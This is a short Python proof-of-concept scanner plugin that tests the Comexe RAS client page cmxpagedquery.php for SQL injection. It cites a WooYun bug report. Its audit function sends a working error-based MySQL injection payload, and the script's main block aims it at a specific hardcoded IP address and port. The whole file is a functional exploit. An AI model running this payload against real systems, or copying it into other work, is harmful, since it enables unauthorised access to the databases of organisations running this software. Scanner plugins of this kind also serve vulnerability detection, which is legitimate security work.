#!/usr/bin/env python
# -*- coding: utf-8 -*-
#POC Name  : 科迈RAS标准版客户端页面cmxpagedquery.php注入
#Author    : 这个程序员不太冷
#Referer   : http://www.wooyun.org/bugs/wooyun-2015-0117921

def assign(service, arg):
     if service == "comexe_ras":
        return True, arg


def audit(arg):    
    payload="AppID[-1]=651&clear=%e6%b8%85%e7%a9%ba&NMFind=%e6%90%9c%e7%b4%a2&pageNo=&sort=DisplayName&sortType=A&ViewAppFld=1) AND (SELECT 4511 FROM(SELECT COUNT(*),CONCAT(md5(123),(SELECT (ELT(4511=4511,1))),0x7e7e7e,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (1461=1461&ViewAppValue=1"
    path="server/cmxpagedquery.php?pgid=AppList&SearchFlag=true"
    target = arg+path
    code, head, res, errcode, _ = curl.curl2(target,payload)
    if code==302 and '202cb962ac59075b964b07152d234b701' in res:
        security_hole(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('comexe_ras','http://223.255.9.145:8083/')[1])
